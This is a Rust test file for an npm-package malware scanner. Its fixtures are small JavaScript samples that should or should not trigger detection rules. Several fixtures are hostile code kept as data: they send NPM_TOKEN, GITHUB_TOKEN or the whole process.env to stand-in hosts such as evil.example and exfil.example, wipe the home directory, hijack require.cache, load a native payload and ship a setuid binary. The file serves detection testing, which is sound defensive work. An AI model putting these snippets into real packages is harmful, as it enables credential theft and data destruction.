fn registry_write_introduction_is_decisive_via_capability() {
    // Capability surface assertion: M8 NPM030 should treat
    // RegistryWrite as decisive-on-introduction. Test through the
    // capability enum directly (the diff pass is exercised by
    // pipeline tests).
    use monomi_core::Capability;
    assert!(Capability::RegistryWrite.is_decisive_on_introduction());
    assert!(Capability::SecretMaterial.is_decisive_on_introduction());
    assert!(Capability::DestructiveFs.is_decisive_on_introduction());
    assert!(Capability::SetuidBinary.is_decisive_on_introduction());
}

// --- M13b: NPM037-046 -----------------------------------------------

fn build_tgz_with_modes(files: &[(&str, &[u8], u32)]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut b = Builder::new(&mut gz);
        for (path, data, mode) in files {
            let mut h = Header::new_gnu();
            h.set_path(path).unwrap();
            h.set_size(data.len() as u64);
            h.set_mode(*mode);
            h.set_cksum();
            b.append(&h, *data).unwrap();
        }
        b.finish().unwrap();
    }
    gz.finish().unwrap()
}

#[test]
fn main_module_branch_event_stream_shape_fires_npm037() {
    let pkg = r#"{ "name": "stream-helper", "version": "0.0.1" }"#;
    let src = r#"
        var main = require.main.filename;
        if (main.indexOf("copay-dash") !== -1) {
            require('./payload.js');
        }
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM037"), "expected NPM037, got {ids:?}");
}

#[test]
fn main_module_without_pkg_name_compare_does_not_fire_npm037() {
    // Common CLI pattern: "am I being required vs run directly?" —
    // reads require.main.filename but compares against __filename,
    // not a package-name literal. Should NOT trip NPM037.
    let pkg = r#"{ "name": "cli", "version": "0.0.1" }"#;
    let src = "if (require.main === module) { run(); }";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM037"), "false positive: {ids:?}");
}

#[test]
fn require_cache_write_fires_npm038() {
    let pkg = r#"{ "name": "hijacker", "version": "0.0.1" }"#;
    let src = r#"
        var target = Object.keys(require.cache).find(k => k.includes('lodash'));
        require.cache[target] = { exports: malicious };
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM038"), "expected NPM038, got {ids:?}");
}

#[test]
fn require_cache_read_does_not_fire_npm038() {
    let pkg = r#"{ "name": "reader", "version": "0.0.1" }"#;
    let src = "var loaded = Object.keys(require.cache);";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM038"), "false positive: {ids:?}");
}

#[test]
fn require_cache_mutation_in_comment_is_suppressed_by_ast_pass_npm038() {
    // The regex alone matches this string. The AST-confirm pass
    // recognizes it sits inside a `//` comment and drops the
    // finding. Pre-AST behavior would have produced a false
    // positive; we explicitly assert the FP is gone.
    let pkg = r#"{ "name": "documented", "version": "0.0.1" }"#;
    let src = r#"
        // Historical note: malware would do
        //   require.cache[targetPath] = { exports: maliciousObj };
        // to hijack a module. We just read for diagnostics:
        console.log(Object.keys(require.cache).length);
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM038"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn require_cache_mutation_in_string_literal_is_suppressed_by_ast_pass_npm038() {
    // README/docstring embedded as a multi-line string literal.
    let pkg = r#"{ "name": "stringy", "version": "0.0.1" }"#;
    let src = r#"
        const DOC = `
            Attackers can do:
                require.cache[mod] = { exports: x };
            so we sanitize on read.
        `;
        module.exports = DOC;
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    // NOTE: oxc reports template literals as string literals at the
    // outer span, so the AST suppression catches this too.
    assert!(!ids.contains(&"NPM038"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn destructive_fs_homedir_fires_npm039() {
    let pkg = r#"{ "name": "wiper", "version": "0.0.1" }"#;
    let src = r#"
        var os = require('os');
        var fs = require('fs');
        fs.rmSync(os.homedir(), { recursive: true, force: true });
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM039"), "expected NPM039, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn rimraf_on_known_build_dir_does_not_fire_npm039() {
    // Legitimate cleanup of a literal build dir — no traversal seed,
    // no homedir, no cwd. Should NOT fire.
    let pkg = r#"{ "name": "build-tool", "version": "0.0.1" }"#;
    let src = "const rimraf = require('rimraf'); rimraf.sync('./dist');";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM039"), "false positive: {ids:?}");
}

#[test]
fn v8_internal_dlopen_fires_npm044() {
    let pkg = r#"{ "name": "loader", "version": "0.0.1" }"#;
    let src = "process.dlopen(module, '/tmp/payload.node');";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM044"), "expected NPM044, got {ids:?}");
}

#[test]
fn setuid_bit_in_tarball_fires_npm046() {
    let pkg = r#"{ "name": "suid", "version": "0.0.1" }"#;
    // 0o4755 = setuid + rwxr-xr-x
    let bytes = build_tgz_with_modes(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/bin/tool", b"#!/bin/sh\necho hi\n", 0o4755),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM046"), "expected NPM046, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn plain_executable_bit_does_not_fire_npm046() {
    let pkg = r#"{ "name": "plain", "version": "0.0.1" }"#;
    let bytes = build_tgz_with_modes(&[
        ("package/package.json", pkg.as_bytes(), 0o644),
        ("package/bin/tool", b"#!/bin/sh\necho hi\n", 0o755),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM046"), "false positive: {ids:?}");
}

// --- NPM041 dataflow-lite token taint -------------------------------

#[test]
fn destructure_env_plus_fetch_fires_npm041() {
    // Variant NPM011 misses: destructuring renames hide the token
    // name from a literal regex, but the bulk-env consumer +
    // network sink combo still fires.
    let pkg = r#"{ "name": "stealth", "version": "0.0.1" }"#;
    let src = r#"
        const { NPM_TOKEN: t, GITHUB_TOKEN: g } = process.env;
        fetch('https://evil.example/c', { method: 'POST', body: t + ':' + g });
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM041"), "expected NPM041, got {ids:?}");
}

#[test]
fn json_stringify_env_in_postinstall_is_decisive_npm041() {
    let pkg = r#"{
        "name": "ship-it",
        "version": "0.0.1",
        "scripts": {
            "postinstall": "node -e \"require('https').request({host:'evil',path:'/'+JSON.stringify(process.env)}).end()\""
        }
    }"#;
    let bytes = build_tgz(&[("package/package.json", pkg.as_bytes())]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM041"), "expected NPM041, got {ids:?}");
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn for_in_env_with_exec_sink_fires_npm041() {
    let pkg = r#"{ "name": "loop-leak", "version": "0.0.1" }"#;
    let src = r#"
        var cp = require('child_process');
        var leak = '';
        for (var k in process.env) { leak += k + '=' + process.env[k] + ';'; }
        cp.exec('curl -d "' + leak + '" https://exfil.example');
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM041"), "expected NPM041, got {ids:?}");
}

#[test]
fn dotenv_style_env_read_without_network_does_not_fire_npm041() {
    // dotenv / config libraries bulk-read process.env but do not
    // network out. Should NOT trip NPM041.
    let pkg = r#"{ "name": "dotenv-clone", "version": "0.0.1" }"#;
    let src = r#"
        const cfg = {};
        for (const k in process.env) { cfg[k] = process.env[k]; }
        module.exports = cfg;
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM041"), "false positive: {ids:?}");
}

#[test]
fn http_client_without_bulk_env_does_not_fire_npm041() {
    // axios-style client that uses fetch but doesn't bulk-read env.
    let pkg = r#"{ "name": "thin-client", "version": "0.0.1" }"#;
    let src = r#"
        const url = process.env.API_URL;
        fetch(url).then(r => r.json()).then(console.log);
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM041"), "false positive: {ids:?}");
}

// --- NPM050 minified-no-source --------------------------------------

fn minified_blob() -> String {
    let chunk = "function _(a,b,c){return a+b*c}var x=_(1,2,3);";
    let mut s = String::new();
    while s.len() < 2048 {
        s.push_str(chunk);
    }
    s
}

#[test]
fn minified_dist_without_map_fires_npm050() {
    let pkg = r#"{ "name": "no-source", "version": "0.0.1", "main": "dist/index.js" }"#;
    let blob = minified_blob();
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/dist/index.js", blob.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM050"), "expected NPM050, got {ids:?}");
}

#[test]
fn minified_dist_with_companion_map_does_not_fire_npm050() {
    let pkg = r#"{ "name": "with-map", "version": "0.0.1", "main": "dist/index.js" }"#;
    let blob = minified_blob();
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/dist/index.js", blob.as_bytes()),
        ("package/dist/index.js.map", b"{\"version\":3,\"sources\":[]}"),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM050"), "false positive: {ids:?}");
}

#[test]
fn minified_dist_with_readable_ts_companion_does_not_fire_npm050() {
    let pkg = r#"{ "name": "with-src", "version": "0.0.1", "main": "dist/index.js" }"#;
    let blob = minified_blob();
    let readable = "export function add(a: number, b: number): number {\n  return a + b;\n}\n";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/dist/index.js", blob.as_bytes()),
        ("package/src/index.ts", readable.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM050"), "false positive: {ids:?}");
}

#[test]
fn readable_dist_does_not_fire_npm050() {
    let pkg = r#"{ "name": "readable", "version": "0.0.1", "main": "dist/index.js" }"#;
    let src = "module.exports = function add(a, b) {\n  return a + b;\n};\n";
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/dist/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM050"), "false positive: {ids:?}");
}

// --- AST rollout: comment/string FP suppression on existing rules ---
//
// These tests document each rule's new behavior post-AST-rollout:
// regex hits buried in comments or string/template literals are
// dropped. The same source without the surrounding comment/string
// still fires — covered by the existing positive tests above.

#[test]
fn self_delete_in_comment_is_suppressed_npm018() {
    let pkg = r#"{ "name": "doc-only", "version": "0.0.1" }"#;
    let src = r#"
        // Bad: fs.unlinkSync(__filename) — would self-delete payload.
        // We only read:
        console.log(__filename);
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM018"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn encoded_url_bytes_in_comment_is_suppressed_npm015() {
    let pkg = r#"{ "name": "explainer", "version": "0.0.1" }"#;
    let src = r#"
        // Static-scanner evasion looks like: [104, 116, 116, 112].
        // We use a clean URL constant instead:
        const URL = 'https://example.com';
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM015"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn v8_internal_in_string_literal_is_suppressed_npm044() {
    let pkg = r#"{ "name": "docs", "version": "0.0.1" }"#;
    let src = r#"
        const RISKS = "Watch for process.dlopen(handle, path) — addon load bypass.";
        module.exports = RISKS;
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM044"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn destructive_fs_in_template_literal_is_suppressed_npm039() {
    // A README-style explainer paired with a real homedir read for
    // legitimate diagnostic output. Pre-AST behavior would have
    // tripped NPM039 because both regexes match the file.
    let pkg = r#"{ "name": "diag", "version": "0.0.1" }"#;
    let src = r#"
        const os = require('os');
        const DOC = `
            Attacker shape we DON'T do here:
              rimraf(os.homedir())
            We only print the path:
        `;
        console.log(DOC, os.homedir());
    "#;
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM039"), "AST-confirm should have suppressed: {ids:?}");
}

#[test]
fn eval_blob_with_eval_in_comment_is_suppressed_npm005() {
    // Large base64 blob is fine (data URI, config dump, etc.); the
    // only `eval(` mention sits in an explanatory comment, so NPM005
    // should not fire.
    let pkg = r#"{ "name": "data", "version": "0.0.1" }"#;
    let blob = "A".repeat(2048);
    let src = format!(
        r#"
        // We do NOT eval(payload) here. This is a static data URI:
        export const DATA = "{blob}";
        "#
    );
    let bytes = build_tgz(&[
        ("package/package.json", pkg.as_bytes()),
        ("package/index.js", src.as_bytes()),
    ]);
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"NPM005"), "AST-confirm should have suppressed: {ids:?}");
}
